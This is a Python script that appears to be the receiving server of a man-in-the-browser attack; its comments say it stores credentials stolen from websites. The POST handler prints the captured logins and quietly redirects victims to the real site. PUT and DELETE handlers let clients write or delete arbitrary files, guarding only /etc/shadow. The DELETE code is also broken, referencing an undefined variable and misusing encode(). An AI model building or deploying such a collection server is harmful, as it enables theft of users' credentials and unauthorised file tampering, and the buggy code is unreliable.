import os
import sys
from html.parser import HTMLParser
import http.server
import socketserver
import urllib
import urllib.request 
from urllib.request import urlopen

#THE ADDRESS FOR THIS WEB SERVER: =>  localhost:80

#When running this program, enter it in the cmd as: =>  python3 MitB.py HTTPServer.py
#We need this server to store all credentials stolen from websites 
class CredRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        creds = self.rfile.read(content_length).decode('utf-8')
        print(creds)
        site = self.path[1:]
        self.send_response(301)
        self.send_header('Location', urllib.request.unquote(site))
        self.end_headers()

    def do_PUT(self):
        path = self.translate_path(self.path)
        if path.endswith('/'):
            self.send_response(405, "Method Not Allowed")
            self.wfile.write("PUT not allowed on a directory\n".encode())
            return
        else:
            try:
                os.makedirs(os.path.dirname(path)) #This translates the mian file path so it cna be handled bette for the main server side end
            except FileExistsError: pass
            length = int(self.headers['Content-Length'])
            with open(path, 'wb') as f:
                f.write(self.rfile.read(length))
            self.send_response(201, "Created")

    #This is going to allow OUR http server to handle incomming DELETE requests from client side connections
    def do_DELETE(self):

        #The first thing we need to do is secure the mian path that is needed to process the request
        delete_path = self.translate_path(self.path) #This is going to translate and handle the file path target for the resource on the HTTP server we wish to delete

        print(delete_path)
        
        #Next we are going to perform a quikc chekc in order to prevent the end user from deletign an extremely sensitive file n the base system of the HTTP server
        if delete_path.endswith('/etc/shadow'):

            #If it detects that a shadow file is at play for the mian DELETE request, thenwe need to flag it as an illegal method an have the resposne sent backt to the user 
            self.send_response(405, "METHOD NOT ALLOWED")
            self.wfile.write("YOU CANNOT DELETE SUCH RESOURCE IN THE ROOT DRIECTORY OF THE SYSTEM").encode()

        else:

            #If it doens' end withthe fiel path that we are defending for, then we begin performing the main actions on the directory for the HTTP request 
            try:
                os.remove(os.path.dirname(delete_request)) #This is goign to perfrom the delete http request in the directory the client side sent to the server 

            except FileNotFoundError: pass

            self.send_response(200, "RESORUCE REMOVED")
            self.wfile.write("THE RESORUCE YOU'VE TARGETED HAS BEEN REMOVED!").encode()


address = ("", 80)
#Leave the TCPServer IP address '0.0.0.0' or blank '' to listen to all IP addresses
#os.system("dir > dir.txt")
server = socketserver.TCPServer(address, CredRequestHandler)
server.serve_forever()
